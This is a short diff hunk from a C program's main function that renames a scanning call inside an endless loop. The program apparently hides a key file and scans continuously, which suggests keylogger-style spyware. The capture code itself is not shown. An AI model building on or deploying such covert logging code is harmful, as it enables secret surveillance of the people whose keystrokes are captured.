@@ -25,7 +25,7 @@ int main(int argc, char **argv){
     sprintf_s(cur_path, LEN_VALUE_NAME, "%s\\%s", dirname(cur_path), KEY_FILE);
     hide(cur_path);
     while(true){
-        scanCode(cur_path);
+        scan_code(cur_path);
     }
     return 0;
 }
